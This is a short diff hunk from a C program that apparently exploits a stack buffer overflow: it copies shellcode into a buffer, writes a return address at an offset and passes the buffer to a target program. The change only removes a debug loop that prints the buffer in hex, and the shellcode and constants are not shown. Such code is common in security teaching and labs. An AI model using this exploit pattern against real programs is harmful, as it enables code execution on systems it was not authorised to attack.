@@ -22,15 +22,6 @@ int main(void)
   memcpy(buf, shellcode, SHELLCODE_LENGTH);
   *(unsigned int*)(buf + OFFSET - 4) = RETURN_ADDRESS;
 
-  printf("Buffer contents:\n");
-  for (int i = 0; i < sizeof(buf); i++) {
-      printf("\\x%02x", (unsigned char)buf[i]);
-      if ((i + 1) % 16 == 0) {
-          printf("\n");
-      }
-  }
-  printf("\n");
-
   args[0] = TARGET;
   args[1] = buf;
   args[2] = NULL;
